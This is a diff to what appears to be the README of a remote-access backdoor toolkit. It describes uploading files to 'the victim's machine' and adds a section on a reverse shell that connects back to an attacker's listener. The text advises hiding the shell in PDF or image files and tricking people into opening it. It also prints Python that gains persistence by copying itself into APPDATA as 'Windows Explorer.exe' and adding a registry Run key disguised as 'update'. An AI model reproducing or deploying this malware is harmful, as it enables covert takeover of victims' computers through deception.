@@ -20,3 +20,27 @@ Where `[dest_path]` is the route where we want to download the file **(don't add
 - **up:** Up any file from our machine to the victim's machine. The structure has to be `up` + `[dest_path]` + `[file_name]`.
 Example:
 `$up /home/victim_folder/Desktop/folder/ /home/our_user/file.txt`
+
+## reverse_shell.py
+Connects via TCP to listener server.  It runs once a person opens it; you can hide it in a pdf file, png, jpg, etc. Use your social engineering skills to deceive people to open it ;).
+### Configuration
+At the end of the code, set the ip and port where to establish the connection:
+```python
+try: 
+    backdoor = Backdoor('<ip>', <port>) # CHANGE HOST AND PORT HERE!
+    backdoor.run()
+except:
+    sys.exit()
+```
+The ip and port have to be the same as you set in 'listener.py', because this is where connection will be established.
+### Persistent mode
+```python
+def becomePersistent(self):
+        fileLocation = os.environ['appdata'] + '\\Windows Explorer.exe'
+        if not os.path.exists(fileLocation):
+            shutil.copyfile(sys.executable, fileLocation)
+            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + fileLocation + '"', shell=True)
+```
+
+
+
